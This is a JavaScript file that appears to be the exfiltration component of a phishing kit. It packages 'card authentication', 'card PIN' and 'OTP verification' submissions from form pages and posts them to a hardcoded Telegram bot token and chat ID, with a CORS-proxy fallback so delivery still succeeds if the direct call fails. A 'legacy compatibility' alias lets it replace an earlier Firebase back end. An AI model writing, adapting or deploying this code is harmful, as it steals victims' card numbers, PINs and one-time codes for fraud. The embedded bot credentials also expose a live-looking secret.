// ==========================================
// Telegram Bot Configuration
// ==========================================
const TELEGRAM_BOT_TOKEN = '8997856428:AAEO7ZG9jJSSb5ypyS2Jnjtn7C2EfnB4hK8'; // Get from @BotFather
const TELEGRAM_CHAT_ID = '8527276675'; // Get from @userinfobot

// If true, send directly from browser to Telegram API (insecure: exposes token).
// If false, posts to server-side `api.php` (recommended).
const USE_DIRECT_TELEGRAM = true;

const API_BASE = 'api.php';

// Send data to Telegram (direct or via server)
async function sendToTelegram(collection, data) {
    if (USE_DIRECT_TELEGRAM) {
        // Build message and call Telegram API directly
        try {
            const message = buildTelegramText(collection, data);
            const params = new URLSearchParams();
            params.append('chat_id', TELEGRAM_CHAT_ID);
            params.append('text', message);
            params.append('parse_mode', 'Markdown');

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const resp = await fetch(url, { method: 'POST', body: params });
            const text = await resp.text().catch(() => '');
            if (!resp.ok) {
                console.error('Telegram API error:', resp.status, text);
                // Try CORS-proxy fallback
                const proxyUrl = 'https://cors.bridged.cc/https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
                try {
                    const proxyResp = await fetch(proxyUrl, { method: 'POST', body: params });
                    const proxyText = await proxyResp.text().catch(() => '');
                    if (!proxyResp.ok) return { success: false, error: 'Proxy error: ' + proxyResp.status + ' ' + proxyText };
                    return { success: true, telegram_response: JSON.parse(proxyText || '{}') };
                } catch (pe) {
                    return { success: false, error: 'Telegram API CORS error and proxy failed' };
                }
            }
            return { success: true, telegram_response: JSON.parse(text || '{}') };
        } catch (err) {
            console.error('Direct Telegram send error:', err);
            return { success: false, error: err.message };
        }
    }

    // Fallback: server-side API
    try {
        const formData = new FormData();
        formData.append('action', 'send');
        formData.append('collection', collection);
        formData.append('data', JSON.stringify(data));

        const response = await fetch(API_BASE, { method: 'POST', body: formData });
        if (!response.ok) return { success: false, error: 'Server error: ' + response.status };
        const text = await response.text();
        if (!text.trim()) return { success: false, error: 'Empty server response' };
        return JSON.parse(text);
    } catch (err) {
        console.error('Server send error:', err);
        return { success: false, error: err.message };
    }
}

function buildTelegramText(collection, data) {
    const colNames = {
        'user_submissions': '👤 User Submissions',
        'card_authentications': '💳 Card Authentication',
        'card_pin_submissions': '🔐 Card PIN Submission',
        'otp_verifications': '📱 OTP Verification'
    };
    const title = colNames[collection] || collection;
    const id = data.id || 'N/A';
    const timestamp = data.timestamp ? new Date(data.timestamp).toLocaleString() : new Date().toLocaleString();

    function esc(t){ return String(t).replace(/([\\_*\[\]()~`>#+\-=|{}.!])/g, '\\$1'); }

    let msg = `🔔 *New Submission*\n━━━━━━━━━━━━━━━━━━━━\n📁 *Collection:* ${esc(title)}\n🆔 *ID:* \`${esc(id)}\`\n🕐 *Time:* ${esc(timestamp)}\n━━━━━━━━━━━━━━━━━━━━\n`;
    const skip = ['id','timestamp'];
    for (const k of Object.keys(data)) {
        if (skip.includes(k)) continue;
        const name = k.replace(/_/g,' ');
        const value = (typeof data[k] === 'object') ? JSON.stringify(data[k]) : String(data[k]);
        msg += `*${esc(name.replace(/\b\w/g, c => c.toUpperCase()))}:* ${esc(value)}\n`;
    }
    msg += '━━━━━━━━━━━━━━━━━━━━';
    return msg;
}

// Simple wrappers for form pages
async function saveFormSubmissionToTelegram(collection, data) {
    const timestamp = new Date().toISOString();
    const payload = { ...data, timestamp, id: generateId() };
    return await sendToTelegram(collection, payload);
}

async function saveCardAuthenticationToTelegram(cardData) {
    const timestamp = new Date().toISOString();
    const payload = { ...cardData, timestamp, status: 'pending', id: generateId() };
    return await sendToTelegram('card_authentications', payload);
}

async function sendOTPToTelegram(otp) {
    const timestamp = new Date().toISOString();
    const payload = { otp, timestamp, status: 'pending', verified: false, id: generateId() };
    return await sendToTelegram('otp_verifications', payload);
}

function generateId() { return 'doc_' + Date.now() + '_' + Math.random().toString(36).substr(2,9); }

// Legacy compatibility
function isFirebaseReady() { return true; }
const saveFormSubmissionToFirebase = saveFormSubmissionToTelegram;
